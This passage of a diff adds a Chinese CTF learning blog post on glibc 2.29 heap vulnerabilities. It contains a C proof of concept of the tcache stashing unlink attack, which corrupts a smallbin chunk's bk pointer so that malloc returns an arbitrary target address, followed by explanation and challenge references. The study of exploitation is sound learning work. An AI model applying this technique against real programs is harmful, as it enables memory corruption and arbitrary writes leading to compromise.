+	victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim2)<span class="hljs-number">-0x10</span>;
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, 
+		victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);
+
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n3. choose a stable size and free five identical size chunks to tcache_entry list\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Here, I choose the size 0x60\n"</span>);
+	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)&#123;
+		t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);
+		<span class="hljs-built_in">free</span>(t1);
+	&#125;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, 
+		t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n"</span>);
+
+	s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk %p, whose size is beyond tcache size threshold\n"</span>, s1);
+	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a padding chunk, avoid %p to merge to top chunk\n"</span>, s1);
+	<span class="hljs-built_in">free</span>(s1);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Free chunk %p to unsortedbin\n"</span>, s1);
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n"</span>);
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s1+<span class="hljs-number">0x3c0</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Repeat the above steps, and free another chunk into corresponding smallbin\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n"</span>);
+	s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);
+	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);
+	<span class="hljs-built_in">free</span>(s2);
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s2+<span class="hljs-number">0x3c0</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"smallbin[4] list is %p &lt;--&gt; %p\n"</span>, s2+<span class="hljs-number">0x3c0</span>, s1+<span class="hljs-number">0x3c0</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Change %p's bk pointer to &amp;victim-0x10 address: 0x%lx\n"</span>, s2+<span class="hljs-number">0x3c0</span>, (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>);
+	*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n"</span>);
+
+	<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, 
+		&amp;victim, s2+<span class="hljs-number">0x3d0</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Apply to tcache_entry[4], you can get a pointer to victim address\n"</span>);
+	
+	<span class="hljs-keyword">uint64_t</span> *r = (<span class="hljs-keyword">uint64_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);
+	r[<span class="hljs-number">0</span>] = <span class="hljs-number">0xaa</span>;
+	r[<span class="hljs-number">1</span>] = <span class="hljs-number">0xbb</span>;
+	r[<span class="hljs-number">2</span>] = <span class="hljs-number">0xcc</span>;
+	r[<span class="hljs-number">3</span>] = <span class="hljs-number">0xdd</span>;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, 
+		victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim2's value: 0x%lx\n"</span>,
+		victim2);
+
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+&#125;</code></pre></div>
+
+<h4 id="调试过程-1"><a href="#调试过程-1" class="headerlink" title="调试过程"></a>调试过程</h4><p>基本跟第2个一样，断点还是断在相似的位置，然后分析相关位置的代码即可。</p>
+<p>调试完成发现，其跟第二个十分相似，只是在第二个中保证的是：<code>目标地址+8</code>为一个可写的地址即可。然而想要实现一个地方写入一个巨大的<code>main_arena</code>附近的值，只需把<code>目标地址+8</code>为这个地方-0x10即可。</p>
+<div class="hljs"><pre><code class="hljs c">bck-&gt;fd = bin;</code></pre></div>
+
+<h4 id="小总结-2"><a href="#小总结-2" class="headerlink" title="小总结"></a>小总结</h4><p>重点操作在：</p>
+<ul>
+<li>将 Smallbins 里的后一个进入的chunk的 bk 设置为目标地址 1 减 0x10</li>
+<li>将目标地址 1 加 0x8 的位置设置为目标地址 2 减 0x10。</li>
+</ul>
+<p>这样就可以分配到目标地址 1的chunk，同时向目标地址 2 写入一个大数字。</p>
+<h3 id="相关例题-1"><a href="#相关例题-1" class="headerlink" title="相关例题"></a>相关例题</h3><ul>
+<li><code>2019-HITCON-one_punch_man</code></li>
+<li><code>2019-HITCON-lazyhouse</code></li>
+<li><code>2020-XCTF-GXZY-twochunk</code></li>
+<li><code>BUU 新春红包3</code></li>
+</ul>
+<p>其中均为libc2.29下的题目，但是基本不影响对漏洞利用的学习。</p>
+<h2 id="参加链接"><a href="#参加链接" class="headerlink" title="参加链接"></a>参加链接</h2><p><a href="https://zhuanlan.zhihu.com/p/136983333" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/136983333</a></p>
+<p><a href="http://blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/#2020-XCTF-GXZY-twochunk%EF%BC%88tcache-stashing-unlink-attack-plus-plus%EF%BC%89" target="_blank" rel="noopener">http://blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/#2020-XCTF-GXZY-twochunk%EF%BC%88tcache-stashing-unlink-attack-plus-plus%EF%BC%89</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                      <a class="hover-with-bg" href="/tags/heap/">heap</a>
+                    
+                      <a class="hover-with-bg" href="/tags/学习记录/">学习记录</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/11/04/湖湘杯ctf2020部分wp/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">湖湘杯ctf2020部分wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/27/Bytectf2020部分wp/">
+                        <span class="hidden-mobile">Bytectf2020部分wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "glibc 2.29引入stash 机制后引起的相关漏洞学习&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "left",
+      visible: "hover",
+      
+      icon: "#"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
